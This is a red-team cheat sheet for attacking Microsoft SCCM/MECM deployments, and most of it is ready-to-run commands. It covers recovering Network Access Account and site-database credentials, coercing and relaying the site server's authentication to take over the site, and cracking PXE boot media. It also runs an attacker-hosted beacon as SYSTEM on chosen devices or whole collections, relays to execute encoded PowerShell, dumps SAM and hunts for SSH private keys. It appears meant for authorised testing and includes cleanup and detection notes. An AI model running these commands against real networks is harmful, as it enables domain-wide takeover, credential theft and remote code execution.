# AD - SCCM / MECM (Configuration Manager) Attack

> Observation first: before firing a single SharpSCCM command, know **your role and your reach**. SCCM/MECM administers every enrolled endpoint in the domain, so the interesting question is never "is there an exploit" — it is *who owns the site server, where the site database lives, which account the client uses to reach content (the NAA), and whether the site server / client-push account will authenticate to me on demand*. Most SCCM wins are **identity and trust**: the site server's machine account is effectively Tier-0, the site database (`CM_<sitecode>`) is the crown jewels, and application deployment is signed, first-party code execution as SYSTEM on any device. Enumerate first; deploy last.

## Table of Contents
- [What SCCM Is & Why It's Tier-0-Adjacent](#what-sccm-is--why-its-tier-0-adjacent)
- [Discovery (Site Server / MP / Site Code)](#discovery-site-server--mp--site-code)
- [Enumeration (SharpSCCM / PowerSCCM)](#enumeration-sharpsccm--powersccm)
- [NAA Credential Recovery](#naa-credential-recovery)
- [Site Database Credential Harvesting](#site-database-credential-harvesting)
- [Coercion + Relay to SCCM / MSSQL (Site Takeover)](#coercion--relay-to-sccm--mssql-site-takeover)
- [Application Deployment (Lateral Code Exec)](#application-deployment-lateral-code-exec)
- [CMPivot (Enumeration at Scale)](#cmpivot-enumeration-at-scale)
- [PXE / OSD Boot-Media Password Recovery](#pxe--osd-boot-media-password-recovery)
- [Decision Table](#decision-table)
- [Cleanup & OPSEC](#cleanup--opsec)

Coerced NetNTLM capture/relay mechanics (signing, EPA, cross-protocol constraints, ntlmrelayx flags) live in ntlm-relay.md. The site-database relay in this file lands on MSSQL — server/DB enumeration, `xp_cmdshell`, impersonation, and linked servers are in mssql.md. SpecterOps' "Misconfiguration Manager" catalogs these as CRED/RECON/ELEVATE/TAKEOVER technique IDs.

---

## What SCCM Is & Why It's Tier-0-Adjacent

System Center Configuration Manager (SCCM), now branded Microsoft Endpoint Configuration Manager (MECM/ConfigMgr), is Microsoft's enterprise device-management platform. Key roles:

- **Site server** — the brain of a *primary site*. Its **machine account** is a local admin (via the `SMS Admins` group / DCOM) on the SMS Provider and typically has `sysadmin` on the site database. Compromising it ≈ compromising every managed client. Treat it as **Tier 0**.
- **Site database** — a MSSQL DB named `CM_<sitecode>` holding the entire RBAC model, device inventory, collection membership, and (historically) credential blobs. Write access to its RBAC tables = you make yourself a **Full Administrator**.
- **SMS Provider** — WMI abstraction layer (`root\SMS\site_<sitecode>`) that admin consoles and SharpSCCM's `get`/`invoke` talk to. Membership in `SMS Admins` gates it.
- **Management Point (MP)** — the HTTP(S) endpoint clients pull policy from; it hands out the (encrypted) NAA and other policy secrets. SharpSCCM's `get` commands query it over HTTP.
- **Distribution Point (DP)** — hosts content/packages; often exposes files anonymously (CMLoot) and PXE boot media.
- **Client** — every managed endpoint runs the CCM agent; it caches policy secrets locally in WMI/`OBJECTS.DATA`.

Why it matters for red team (CRTO / CRTeamer-adjacent modern paths): SCCM sits *above* the normal tiering — a single misconfigured NAA, a coercible site server, or a readable DP gives credentials or SYSTEM-level exec across the whole estate, frequently a faster route to DA/EA than classic AD ACL chains.

---

## Discovery (Site Server / MP / Site Code)

SCCM publishes itself to AD (when the schema is extended and "Publish this site to AD" is on). Find the plumbing before authenticating anywhere.

```powershell
# SharpSCCM - LDAP discovery of MPs / site info from a domain-joined host (or with creds)
SharpSCCM.exe get site-info -d corp.local        # queries the DC via LDAP for site + MP
SharpSCCM.exe local site-info                    # WMI: MP + site code the LOCAL client is using

# LDAP: SCCM System Management container holds MP/server objects (mSSMSManagementPoint class)
Get-ADObject -SearchBase "CN=System Management,CN=System,DC=corp,DC=local" -Filter * -Properties *
# PowerView equivalent
Get-DomainObject -SearchBase "LDAP://CN=System Management,CN=System,DC=corp,DC=local"
```

```bash
# LDAP from Linux - the System Management container + mSSMSMP objects
ldapsearch -x -H ldap://<DC> -D 'corp\jsmith' -w 'Passw0rd!' \
  -b "CN=System Management,CN=System,DC=corp,DC=local" "(objectClass=mSSMSManagementPoint)" \
  dNSHostName mSSMSSiteCode mSSMSMPName

# SPNs: site systems register these (NetBIOS/HTTP); enumerate like any SPN
GetUserSPNs.py corp.local/jsmith:'Passw0rd!' -dc-ip <DC> | grep -iE 'MSSQLSvc|HTTP'   # site DB + MP hints

# DNS: clients auto-discover MPs via well-known records (site code in the name)
nslookup -type=SRV _mssms_mp_<sitecode>._tcp.corp.local
nslookup SMSMP.corp.local                                  # common MP alias
```

```bash
# sccmhunter (Linux) - all-in-one recon: finds MP/SMS provider/site DB via LDAP + SMB + HTTP
sccmhunter.py find     -u jsmith -p 'Passw0rd!' -d corp.local -dc-ip <DC>
sccmhunter.py show     -all                                # dump what was discovered to the local DB
sccmhunter.py smb      -u jsmith -p 'Passw0rd!' -d corp.local -dc-ip <DC>   # probe site systems over SMB
```

Key facts:
- **Site code** = 3 chars (e.g. `PS1`); SharpSCCM defaults to the local client's current MP/site code, so on a managed host you often need no `-mp`/`-sc` at all.
- The **System Management** container ACL itself is worth reading — write access there = you can spoof a management point.

---

## Enumeration (SharpSCCM / PowerSCCM)

Once you can reach the SMS Provider (member of `SMS Admins`) or the MP over HTTP, map the environment: devices, collections, admins, and where privilege leaks.

```powershell
# SharpSCCM 'get' - fetch objects from the SMS Provider (WMI) / MP (HTTP) / DC (LDAP)
SharpSCCM.exe get devices        -sms <SMSProvider> -sc PS1        # all managed devices
SharpSCCM.exe get devices        -u <lastuser>                    # devices a given user last logged into
SharpSCCM.exe get collections    -sms <SMSProvider> -sc PS1        # device/user collections (deploy targets)
SharpSCCM.exe get collection-members -n "All Systems"
SharpSCCM.exe get admins         -sms <SMSProvider> -sc PS1        # SCCM RBAC admins + security roles
SharpSCCM.exe get primary-users  -u corp\\admin                   # user<->device affinity (find the DA's box)
SharpSCCM.exe get class-instances SMS_R_System -p Name -p IPAddresses   # arbitrary WMI class query
SharpSCCM.exe get site-push-settings                              # is automatic client push + fallback-to-NTLM on?
```

```powershell
# PowerSCCM (older, still handy) - session then Get-SCCM*
Find-LocalSccmInfo; Find-SccmSiteCode -ComputerName <MP>
$s = New-SccmSession -ComputerName <SMSProvider> -SiteCode PS1 -ConnectionType WMI
Get-SccmSession | Get-SccmComputer
Get-SccmSession | Get-SccmCollection
Get-SccmSession | Get-SccmApplication
Get-SccmSession | Get-SccmService                                 # service accounts referenced by the site
```

`get site-push-settings` is a priority read: if **automatic client push installation** is enabled *and* "allow NTLM fallback" is on, the site server can be coerced into authenticating to you as its push account / machine account (see the relay section).

---

## NAA Credential Recovery

The **Network Access Account (NAA)** is a domain account SCCM clients use to reach content when their own machine context cannot (e.g. during OSD). Its credentials are pushed to *every* client inside machine policy and stored **DPAPI-encrypted** in WMI/`OBJECTS.DATA`. Recovering them yields a real domain credential — frequently over-privileged in the wild. Retrieval needs local admin (for the DPAPI machine key) on any managed client, or an MP-side pull.

```powershell
# SharpSCCM - locally, as admin on a managed client (decrypts DPAPI blobs for you)
SharpSCCM.exe local secrets -m wmi     # read from root\ccm\policy\Machine\ActualConfig via WMI
SharpSCCM.exe local secrets -m disk    # parse OBJECTS.DATA directly (stealthier; avoids WMI)
SharpSCCM.exe local naa                # alias of 'local secrets' - NAA, task-sequence & collection-var creds

# Pull NAA policy from the MANAGEMENT POINT over HTTP by registering a rogue device record
# (no admin on a client needed - you impersonate a newly-enrolled client)
SharpSCCM.exe get naa -mp <MP> -sc PS1 -r        # -r registers a client, requests machine policy, decrypts
SharpSCCM.exe get naa -mp <MP> -sc PS1 -u corp\\jsmith -p 'Passw0rd!'
```

```bash
# Linux equivalents
sccmhunter.py http -u jsmith -p 'Passw0rd!' -d corp.local -dc-ip <DC> -auto   # register + pull policy secrets
# Manual DPAPI on a triaged client image:
#   secrets are under HKLM\SOFTWARE\Microsoft\SMS\... and root\ccm\policy - decrypt with the SYSTEM DPAPI key
```

Notes:
- The NAA is a **credential access** primitive (Misconfiguration Manager `CRED-1/CRED-2`), not exec. Crack/reuse it like any recovered domain cred: spray, check local-admin reach, feed into BloodHound.
- Modern MECM discourages the NAA (prefers Enhanced HTTP / machine context), but legacy NAAs persist and are often forgotten with stale-but-privileged passwords.
- `local secrets` also returns **task sequence** variables and **collection variables** — these frequently embed domain-join or local-admin creds.

---

## Site Database Credential Harvesting

If you reach the site database (`CM_<sitecode>` MSSQL) with sufficient rights — directly as a SQL admin, via the site-server machine account, or via relay (next section) — you can read policy/credential material and the full RBAC model.

```sql
-- Enumerate the site DB (see mssql.md for connection + privesc)
SELECT name FROM sys.databases WHERE name LIKE 'CM[_]%';       -- find CM_<sitecode>
USE CM_PS1;

-- RBAC: who is a Full Administrator (RoleID SMS0001R) - and how to become one
SELECT * FROM RBAC_Admins;                                      -- all SCCM admins (AdminID, LogonName, SIDs)
SELECT * FROM RBAC_ExtendedPermissions;                         -- role assignments per admin/scope
-- Historically-encrypted credential storage (varies by version):
SELECT * FROM SC_UserAccount;                                   -- stored accounts (NAA, client-push, etc.)
SELECT * FROM vSMS_SC_UserAccount;
```

- Reading `SC_UserAccount` yields DPAPI-protected blobs decryptable with the site server's key material (the machine's DPAPI-SYSTEM masterkey) — this is why owning the **site server host** unlocks stored SCCM creds wholesale.
- Inserting/altering rows in `RBAC_Admins` + `RBAC_ExtendedPermissions` to grant your SID the Full Administrator role is the core of the **relay-to-DB site takeover** below.

---

## Coercion + Relay to SCCM / MSSQL (Site Takeover)

The marquee SCCM attack (Misconfiguration Manager `TAKEOVER-1/2/8`). Coerce a privileged SCCM account to authenticate to you, then **relay** it to a target where it is powerful:

1. **Relay the site-server machine account to the site database (MSSQL).** The site server is `sysadmin`/owner of `CM_<sitecode>`, so a relayed session can rewrite the RBAC tables to grant *you* Full Administrator — total control of the hierarchy.
2. **Relay the site-server / client-push account to SMB** on the SMS Provider or another site system where it is local admin → exec / secretsdump.

### Trigger the coercion
`invoke client-push` abuses **automatic client push installation** (when enabled with NTLM fallback): it asks the primary site server to install the client on a host of your choosing, and the site server authenticates outbound to that host — point it at your relay.

```powershell
# SharpSCCM - force the primary site server to authenticate to your listener via NTLM
SharpSCCM.exe invoke client-push -t <ATTACKER_IP>            # over HTTP (WebClient) or SMB
SharpSCCM.exe invoke client-push -t <ATTACKER_IP> -a         # -a: connect via WMI (as-admin) to queue the push
```
```bash
# sccmhunter equivalent
sccmhunter.py mp -u jsmith -p 'Passw0rd!' -d corp.local -dc-ip <DC> -client-push -target <ATTACKER_IP>
```
Generic coercion (PrinterBug/PetitPotam/DFSCoerce/Coercer) against the **site server host** works too — see ntlm-relay.md "Coercion Techniques". For an LDAP-relay outcome you must coerce over HTTP/WebDAV; for the MSSQL/SMB outcomes below, SMB-sourced coercion is fine.

### Relay to the site database (MSSQL)
```bash
# ntlmrelayx: relay the coerced site-server machine account straight to the CM_ database.
# Site-takeover helpers add you to SCCM RBAC as Full Administrator automatically.
ntlmrelayx.py -t mssql://<SITE_DB_HOST> -smb2support -socks           # hold the session, drive with mssqlclient
ntlmrelayx.py -t mssql://<SITE_DB_HOST> -smb2support \
  -q "USE CM_PS1; SELECT name FROM sys.databases;"                   # confirm reach as the site server

# SCCM-aware relay (Garrett Foster / SpecterOps): auto-grants Full Admin in RBAC via the relayed DB session
sccmhunter.py mssql -u '' -p '' ...       # or the dedicated takeover tooling in Misconfiguration Manager
```
Once the relayed session owns `CM_PS1`, add your SID to `RBAC_Admins` / `RBAC_ExtendedPermissions` (or let the tool do it), then reconnect with SharpSCCM as a legitimate **Full Administrator** and deploy applications at will. See mssql.md for driving the held MSSQL session (`-socks` → `mssqlclient.py`), `EXECUTE AS`, and `xp_cmdshell` on the DB host itself.

### Relay to SMB
```bash
# If the coerced account is local admin on a site system (very common for the site-server machine acct):
ntlmrelayx.py -t smb://<SMS_PROVIDER> -smb2support -c 'powershell -enc <b64>'
ntlmrelayx.py -t smb://<SMS_PROVIDER> -smb2support                       # dump SAM
```

Relaying the site server to **LDAP** for RBCD/shadow-creds is another path (needs HTTP-sourced coercion + no LDAP signing/EPA) — mechanics in ntlm-relay.md "Relay to LDAP/LDAPS".

---

## Application Deployment (Lateral Code Exec)

With Full Administrator (or Application Administrator) on the SMS Provider you can push an **application** or **script** to any device or collection — signed, first-party code execution as **SYSTEM** (device deploy) or as the logged-on user. This is SCCM's built-in C2.

```powershell
# SharpSCCM 'exec' - deploy a command / UNC binary to a target and run it
SharpSCCM.exe exec -d <DEVICE> -p "C:\\Windows\\System32\\cmd.exe /c whoami > C:\\out.txt"
SharpSCCM.exe exec -d <DEVICE> -p "\\\\attacker\\share\\beacon.exe" -s      # -s = run as SYSTEM
SharpSCCM.exe exec -rid <ResourceID> -p "powershell -enc <b64>" -s          # target by ResourceID
SharpSCCM.exe exec -n "All Systems" -p "\\\\attacker\\share\\b.exe" -s -t device   # whole collection (loud!)
SharpSCCM.exe exec -u "corp\\admin" -p "cmd /c net user"                    # target a user's devices

# 'exec' can also just coerce NTLM instead of running code (device auths to your -r listener):
SharpSCCM.exe exec -d <DEVICE> -r <ATTACKER_IP>       # request NTLM auth from the client -> relay/capture
```
```powershell
# invoke update - force a targeted client to re-pull policy & run a pending deployment immediately
SharpSCCM.exe invoke update -d <DEVICE>               # kick machine policy retrieval now (speeds up a deploy)
SharpSCCM.exe invoke update -rid <ResourceID> -p machine
```

OPSEC: prefer **`-rid <ResourceID>`** targeting a *single* device over deploying to a broad collection (`All Systems`) — a mass deployment is enormously noisy and destructive. SharpSCCM creates a collection + deployment + application under the hood; clean them up (`remove` group) after. Deployment activity is visible in the SCCM console and `AppEnforce.log`/`execmgr.log` on clients.

---

## CMPivot (Enumeration at Scale)

CMPivot runs live queries (KQL-like) across clients through the admin service / MP — real-time inventory without deploying anything. Great for finding where a target user or file lives before you deploy exec to that one box.

```powershell
# SharpSCCM - run a CMPivot query against a collection or device via the admin service
SharpSCCM.exe invoke admin-service -q "Registry('HKLM:\\SOFTWARE\\...')" -i SMS00001   # whole collection
SharpSCCM.exe invoke admin-service -q "File('C:\\Users\\*\\.ssh\\id_rsa')" -r <ResourceID>
SharpSCCM.exe invoke admin-service -q "AdminUser()" -i SMS00001        # local admins across the collection
SharpSCCM.exe invoke admin-service -q "User()" -j                      # logged-on users (JSON output)
```
Useful CMPivot entities: `File`, `Registry`, `Process`, `User`, `AdminUser`, `LogonUser`, `Service`, `SMBConfig`. CMPivot needs `Read` on the SMS Script + the collection, so it is often available to lower-privileged SCCM operators — a quiet recon channel before any deploy.

---

## PXE / OSD Boot-Media Password Recovery

Distribution Points serving **PXE / OS Deployment** boot media protect the task sequence with a password (or none). The boot media (`.wim`/variables blob, `boot.var`) can be pulled anonymously over TFTP and the password brute-forced offline — recovering it decrypts the task-sequence variables, which frequently contain **domain-join and local-admin credentials**.

```bash
# PXEThief (Christopher Panayi) - the canonical PXE/OSD credential-recovery toolkit
python3 pxethief.py 1                          # discover PXE-enabled DPs on the subnet
python3 pxethief.py 2 <DP_IP>                  # download the boot media / encrypted media variables
python3 pxethief.py 3 <policy.blob>            # attempt to decrypt (no password / weak password)
hashcat -m 19850 pxe.hash wordlist.txt         # crack the PXE boot media password offline
# Then re-run pxethief with the recovered password to dump the task-sequence variables (creds).
```
```powershell
# PowerPXE (alternative, Windows) - grab the variables file over TFTP then decrypt
Get-WimFile -PXEServer <DP_IP>
Get-PXECreds -InterfaceAlias Ethernet
```

Misconfiguration Manager references these as `CRED-3` (PXE media). If PXE is configured with **no password**, decryption is immediate and unauthenticated — a common, high-impact finding. Correlate recovered OSD creds against the NAA and site-database accounts.

---

## Decision Table

| Foothold / access | Fastest SCCM move |
|---|---|
| Domain user, no SCCM rights | Discover MP/site DB (`get site-info`, System Management container, `_mssms_` DNS); pull NAA from the MP (`get naa -mp <MP> -r`); check `get site-push-settings` for coercion path. |
| Local admin on any managed client | `local secrets`/`local naa` → NAA + task-sequence creds (DPAPI-decrypted for you). |
| Automatic client push + NTLM fallback on | `invoke client-push -t <you>` → relay site-server machine acct to `mssql://<siteDB>` → grant self Full Admin (site takeover). |
| Coercion primitive on the site server host | PetitPotam/DFSCoerce → relay to MSSQL (DB rewrite) or SMB (exec on SMS Provider). |
| Full/Application Administrator (SMS Provider) | `exec -rid <id> -s` for SYSTEM code exec on a chosen device; CMPivot to locate the target first. |
| Access to the site database (MSSQL) | Read `SC_UserAccount` (stored creds), rewrite `RBAC_Admins` for Full Admin; pivot on the DB host per mssql.md. |
| PXE-enabled Distribution Point | PXEThief → pull boot media → crack/decrypt → task-sequence creds (`CRED-3`). |
| Readable Distribution Point content | CMLoot the DP shares for embedded scripts/creds (out of scope here; note as a finding). |

---

## Cleanup & OPSEC

- **`invoke client-push`** queues a real client-push attempt and writes to `ccm.log`/`SMS_CLIENT_CONFIG_MANAGER` on the site server — expected-looking but logged; do it from an in-scope host.
- **`exec` / application deployment** creates a **collection + application + deployment**; these persist in the console and replicate across the hierarchy. Delete every artifact with the `remove` command group (`remove application`, `remove device`, `remove collection`) and confirm removal. Client-side traces: `execmgr.log`, `AppEnforce.log`, a new scheduled/child process under `CcmExec.exe`.
- **`get naa -r`** *registers a rogue device record* with the site — record its name/GUID and remove it afterward (`remove device`); an orphaned client object is an obvious tell.
- **Relay-to-DB site takeover** adds rows to `RBAC_Admins`/`RBAC_ExtendedPermissions` — a new Full Administrator that did not go through the console is high-signal; note it for cleanup and for the report.
- **Detection**: client-push coercion + relay shows the usual NTLM-relay footprint (see opsec-and-detection.md — `4624 Type 3` from the site server to your relay, plus `4662`/`5136` if relayed to LDAP). MSSQL relay leaves site-DB login events; application deployment is visible to any SCCM admin watching the console. MDI/EDR increasingly flag SharpSCCM's WMI/HTTP patterns — pace enumeration and prefer targeted `-rid` deploys over collection-wide ones.
- Restore any site setting you toggled; do not leave automatic client push or NTLM fallback in a changed state.
